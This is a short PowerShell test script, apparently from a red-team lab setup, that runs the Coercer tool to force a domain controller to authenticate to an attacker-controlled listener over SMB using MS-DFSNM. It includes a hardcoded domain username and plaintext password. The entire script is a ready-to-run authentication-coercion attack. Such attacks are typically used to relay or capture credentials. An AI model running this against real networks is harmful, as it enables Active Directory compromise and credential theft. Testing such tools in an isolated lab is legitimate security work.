# Test coercer with --smb-port 445 from ws01: check UNC generated + listener bind behavior
$ErrorActionPreference = "Continue"
$env:PYTHONIOENCODING = "utf-8"
$env:PYTHONUTF8 = "1"
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce `
  -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 `
  -t 192.168.77.10 -l 192.168.77.60 --smb-port 445 `
  --filter-protocol-name MS-DFSNM --auth-type smb --always-continue 2>&1 | Select-Object -Last 25
Write-Output "coerce_rc=$LASTEXITCODE"
Write-Output "=== TEST_DONE ==="
